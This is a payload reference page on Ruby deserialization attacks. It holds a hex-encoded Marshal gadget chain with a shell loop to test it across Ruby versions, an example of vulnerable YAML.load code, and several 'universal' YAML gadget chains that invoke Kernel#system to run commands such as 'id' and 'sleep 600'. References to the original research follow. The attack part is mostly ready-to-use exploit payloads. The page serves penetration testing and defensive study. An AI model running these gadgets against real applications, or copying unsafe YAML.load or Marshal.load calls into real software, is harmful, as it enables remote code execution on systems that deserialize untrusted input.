# Ruby Deserialization

> Ruby deserialization is the process of converting serialized data back into Ruby objects, often using formats like YAML, Marshal, or JSON. Ruby's Marshal module, for instance, is commonly used for this, as it can serialize and deserialize complex Ruby objects.


## Summary

* [Marshal Deserialization](#marshal-deserialization)
* [YAML Deserialization](#yaml-deserialization)
* [References](#references)


## Marshal Deserialization

Script to generate and verify the deserialization gadget chain against Ruby 2.0 through to 2.5

```ruby
for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load(["0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446"].pack("H*")) rescue nil'; done
```


## YAML Deserialization

Vulnerable code

```ruby
require "yaml"
YAML.load(File.read("p.yml"))
```

Universal gadget for ruby <= 2.7.2:

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
  - !ruby/object:Gem::Source::SpecificFile
    spec: &1 !ruby/object:Gem::StubSpecification
      loaded_from: "|id 1>&2"
  - !ruby/object:Gem::Source::SpecificFile
      spec:
```

Universal gadget for ruby 2.x - 3.x.

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

```yaml
 ---
 - !ruby/object:Gem::Installer
     i: x
 - !ruby/object:Gem::SpecFetcher
     i: y
 - !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: sleep 600
          method_id: :resolve 
```


## References

- [Ruby 2.X Universal RCE Deserialization Gadget Chain - Luke Jahnke - November 8, 2018](https://www.elttam.com.au/blog/ruby-deserialization/)
- [Universal RCE with Ruby YAML.load - Etienne Stalmans (@_staaldraad) - March 2, 2019](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/)
- [Ruby 2.x Universal RCE Deserialization Gadget Chain - PentesterLab - 2024](https://pentesterlab.com/exercises/ruby_ugadget/course)
- [Universal RCE with Ruby YAML.load (versions > 2.7) - Etienne Stalmans (@_staaldraad) - January 9, 2021](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/)
- [Blind Remote Code Execution through YAML Deserialization - Colin McQueen - June 9, 2021](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)